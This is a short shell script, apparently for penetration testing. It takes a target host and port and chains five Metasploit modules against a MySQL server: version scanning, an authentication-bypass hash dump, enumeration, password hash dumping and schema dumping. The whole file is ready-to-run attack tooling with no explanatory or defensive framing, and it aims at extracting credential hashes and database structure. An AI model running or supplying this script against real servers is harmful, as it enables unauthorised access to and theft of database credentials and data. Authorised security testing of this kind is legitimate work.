#!/bin/sh

TARGET=$1
PORT=$2

printf "MSF Module: auxiliary/scanner/mysql/mysql_version \n"
msfconsole -q -x "use auxiliary/scanner/mysql/mysql_version; set RHOSTS $TARGET; set RPORT $PORT; run; exit"
printf "\n\n\n"

printf "MSF Module: auxiliary/scanner/mysql/mysql_authbypass_hashdump \n"
msfconsole -q -x "use auxiliary/scanner/mysql/mysql_authbypass_hashdump; set RHOSTS $TARGET; set RPORT $PORT; run; exit"
printf "\n\n\n"

printf "MSF Module: auxiliary/admin/mysql/mysql_enum \n"
msfconsole -q -x "use auxiliary/admin/mysql/mysql_enum; set RHOSTS $TARGET; set RPORT $PORT; run; exit" 
printf "\n\n\n"

printf "MSF Module: aauxiliary/scanner/mysql/mysql_hashdump \n"
msfconsole -q -x "use auxiliary/scanner/mysql/mysql_hashdump; set RHOSTS $TARGET; set RPORT $PORT; run; exit"
printf "\n\n\n"

printf "MSF Module: auxiliary/scanner/mysql/mysql_schemadump \n"
msfconsole -q -x "use auxiliary/scanner/mysql/mysql_schemadump; set RHOSTS $TARGET; set RPORT $PORT; run; exit" 
printf "\n\n\n"